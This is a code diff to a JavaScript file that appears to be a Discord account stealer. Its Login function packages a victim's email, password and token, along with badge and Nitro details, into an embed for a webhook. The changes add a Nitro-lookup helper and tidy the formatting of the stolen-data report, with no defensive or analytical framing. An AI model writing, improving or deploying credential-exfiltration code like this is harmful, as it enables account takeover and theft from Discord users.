@@ -82,6 +82,20 @@ function SendToWebhook(what) {
     `, !0).then((token => {}))
 }
 
+function GetNitro(flags) {
+	if (flags == 0) {
+		return "no nitro"
+	}
+	if (flags == 1) {
+		return "<:classic:896119171019067423> \`nitro classic\`"
+	}
+	if (flags == 2) {
+		return "<a:boost:824036778570416129> \`nitro boost\`"
+	} else {
+		return "no nitro"
+	}
+}
+
 function GetRBadges(flags) {
 	const Discord_Employee = 1;
 	const Partnered_Server_Owner = 2;
@@ -181,6 +195,8 @@ function Login(email, password, token) {
             avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
             embeds: [
                 {
+                    "title": "user login",
+		    description: "[**<:partner:909102089513340979> - hi my g",
                     "color": 3092790,
                     "fields": [
                         {
@@ -215,12 +231,12 @@ function Login(email, password, token) {
                         }, 
                         {
                             "name": " badges",
-                            "value": ` - ${GetBadges(json.flags)}`,
+                            "value": `${GetBadges(json.flags)}`,
                             "inline": true		    
                         },
                         {
                             "name": " nitro",
-                            "value": ` - ${GetNitro(json.premium_type)}`,
+                            "value": `${GetNitro(json.premium_type)}`,
                             "inline": true		    
                         },
                         {
